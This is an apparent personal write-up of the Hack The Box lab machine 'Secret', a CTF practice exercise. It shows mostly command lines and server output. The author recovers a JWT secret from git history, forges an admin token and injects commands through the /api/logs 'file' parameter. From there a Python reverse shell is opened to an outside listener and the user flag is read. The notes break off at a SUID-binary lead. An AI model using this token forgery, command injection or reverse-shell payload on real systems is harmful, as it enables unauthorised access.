# Secret

1. Download source code on going to the website (Download Source Code button on website)
2. Check `index.js`, `routes/*.js`
  - Admin username is `theadmin`
  - JSON Web token auth
  - In `routes/forgot.js`, has this code
  
    ```
    router.get('/priv', verifytoken, (req, res) => {
        // res.send(req.user)

        const userinfo = { name: req.user }

        const name = userinfo.name.name;

        if (name == 'theadmin') {
            res.json({
                role: {
                    role: "you are admin",
                    desc: "{path to the binary}"
                }
            })
        }
        else {
            res.json({
                role: {
                    role: "not enough privilages",
                    desc: userinfo.name.name
                }
            })
        }

    })
    ```
    
    
 Testing
 
```
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "Content-Type: application/json" -v 10.10.11.120:3000/api/user/register --data '{"name":"theadmin","email":"email@email.com", "password":"password"}'   1 ⚙
*   Trying 10.10.11.120:3000...
* Connected to 10.10.11.120 (10.10.11.120) port 3000 (#0)
> POST /api/user/register HTTP/1.1
> Host: 10.10.11.120:3000
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 68
> 
* upload completely sent off: 68 out of 68 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 400 Bad Request
< X-Powered-By: Express
< Content-Type: text/html; charset=utf-8
< Content-Length: 18
< ETag: W/"12-bovfAO8maqeTuF6NiWgD46KUq3k"
< Date: Sat, 08 Jan 2022 02:26:13 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.10.11.120 left intact
Name already Exist  
```

Try harder
 
```
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "Content-Type: application/json" -v 10.10.11.120:3000/api/user/register --data '{"name":"theadmin1","email":"email@email.com", "password":"password"}'  1 ⚙
*   Trying 10.10.11.120:3000...
* Connected to 10.10.11.120 (10.10.11.120) port 3000 (#0)
> POST /api/user/register HTTP/1.1
> Host: 10.10.11.120:3000
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 69
> 
* upload completely sent off: 69 out of 69 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 20
< ETag: W/"14-n5L2MGgpBUj53b7v89cuHa3m1JE"
< Date: Sat, 08 Jan 2022 02:26:52 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.10.11.120 left intact
{"user":"theadmin1"}                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "Content-Type: application/json" -v 10.10.11.120:3000/api/user/login --data '{"email":"email@email.com", "password":"password"}'                        1 ⚙
*   Trying 10.10.11.120:3000...
* Connected to 10.10.11.120 (10.10.11.120) port 3000 (#0)
> POST /api/user/login HTTP/1.1
> Host: 10.10.11.120:3000
> User-Agent: curl/7.74.0
> Accept: */*
> Content-Type: application/json
> Content-Length: 50
> 
* upload completely sent off: 50 out of 50 bytes
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< X-Powered-By: Express
< auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ4ZjY2YzY4ZTkzYzA0NjM3YWZjZGMiLCJuYW1lIjoidGhlYWRtaW4xIiwiZW1haWwiOiJlbWFpbEBlbWFpbC5jb20iLCJpYXQiOjE2NDE2MDg4MzB9.E2KHtZpoIlqL2YEnDvvaCCZdB9IirLymDH6jqpc-g48
< Content-Type: text/html; charset=utf-8
< Content-Length: 209
< ETag: W/"d1-Ojz6kOfGqESXmInPMeIBPYXw10o"
< Date: Sat, 08 Jan 2022 02:27:10 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.10.11.120 left intact
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ4ZjY2YzY4ZTkzYzA0NjM3YWZjZGMiLCJuYW1lIjoidGhlYWRtaW4xIiwiZW1haWwiOiJlbWFpbEBlbWFpbC5jb20iLCJpYXQiOjE2NDE2MDg4MzB9.E2KHtZpoIlqL2YEnDvvaCCZdB9IirLymDH6jqpc-g48                    
                                                                                                               
``` 

https://snyk.io/vuln/npm:jsonwebtoken@8.5.1

Changing token auth to none doesn't really work


1. The downloaded files have .git, so dump all commits with GitTools
2. .env file have the secret
3. Use the secret to regenerate the JWT Token, but with a different username `theadmin` from jwt.io

```
┌──(kali㉿kali)-[/tmp/GitTools/Extractor]
└─$ ./extractor.sh /tmp/local-web /tmp/g


...

┌──(kali㉿kali)-[/tmp/g]
└─$ cat */.env
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
TOKEN_SECRET = secret


┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ TOKEN="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ4ZjY2YzY4ZTkzYzA0NjM3YWZjZGMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImVtYWlsQGVtYWlsLmNvbSIsImlhdCI6MTY0MTYwODgzMH0.KWoDxb7BZ4ElqwDvgLwhXQg_3MVbdXnq-G39wHKi7NM"
                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "auth-token: $TOKEN" 10.10.11.120:3000/api/logs -v                                                                                                      1 ⚙
*   Trying 10.10.11.120:3000...
* Connected to 10.10.11.120 (10.10.11.120) port 3000 (#0)
> GET /api/logs HTTP/1.1
> Host: 10.10.11.120:3000
> User-Agent: curl/7.74.0
> Accept: */*
> auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ4ZjY2YzY4ZTkzYzA0NjM3YWZjZGMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImVtYWlsQGVtYWlsLmNvbSIsImlhdCI6MTY0MTYwODgzMH0.KWoDxb7BZ4ElqwDvgLwhXQg_3MVbdXnq-G39wHKi7NM
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 500 Internal Server Error
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 77
< ETag: W/"4d-xY8AsU/eUR22Yy/Fqfzp+1blTxU"
< Date: Sat, 08 Jan 2022 03:44:58 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.10.11.120 left intact
{"killed":false,"code":128,"signal":null,"cmd":"git log --oneline undefined"}                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "auth-token: $TOKEN" 10.10.11.120:3000/api/priv -v                                                                                                      1 ⚙
*   Trying 10.10.11.120:3000...
* Connected to 10.10.11.120 (10.10.11.120) port 3000 (#0)
> GET /api/priv HTTP/1.1
> Host: 10.10.11.120:3000
> User-Agent: curl/7.74.0
> Accept: */*
> auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWQ4ZjY2YzY4ZTkzYzA0NjM3YWZjZGMiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImVtYWlsQGVtYWlsLmNvbSIsImlhdCI6MTY0MTYwODgzMH0.KWoDxb7BZ4ElqwDvgLwhXQg_3MVbdXnq-G39wHKi7NM
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 OK
< X-Powered-By: Express
< Content-Type: application/json; charset=utf-8
< Content-Length: 76
< ETag: W/"4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0"
< Date: Sat, 08 Jan 2022 03:45:03 GMT
< Connection: keep-alive
< 
* Connection #0 to host 10.10.11.120 left intact
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$
```
Reverse shell

```
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "auth-token: $TOKEN" 10.10.11.120:3000/api/logs?file=$(urlencode ".env & python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.6",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")'")
{"killed":false,"code":127,"signal":null,"cmd":"git log --oneline .env & python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((10.10.14.6,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(/bin/sh)'"}                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "auth-token: $TOKEN" 10.10.11.120:3000/api/logs?file=$(urlencode ".env& ls /usr/bin | grep python")                                                     1 ⚙
"ab3e953 Added the codes\ndh_python2\npython2\npython2.7\npython3\npython3.8\n"                                                                                                                                                                        
┌──(kali㉿kali)-[/media/…/Exercises/Hack The Box/Active Boxes/Secret]
└─$ curl -H "auth-token: $TOKEN" 10.10.11.120:3000/api/logs?file=$(urlencode ".env & python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.10.14.6\",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/sh\")'")


```


```
┌──(kali㉿kali)-[/tmp/jwt_tool]
└─$ nc -nlvp 4444                                                                                                                                                   1 ⨯
listening on [any] 4444 ...
connect to [10.10.14.6] from (UNKNOWN) [10.10.11.120] 55756
$ whoami
whoami
dasith
$ pwd
pwd
/home/dasith/local-web
$ cd ..
cd ..
$ ls
ls
local-web  user.txt
$ cat user.txt
cat user.txt
dd216f37c3af395d33386536ddd4384e
$ 

```

SUID binary in `/opt/count`
source code & hex dump log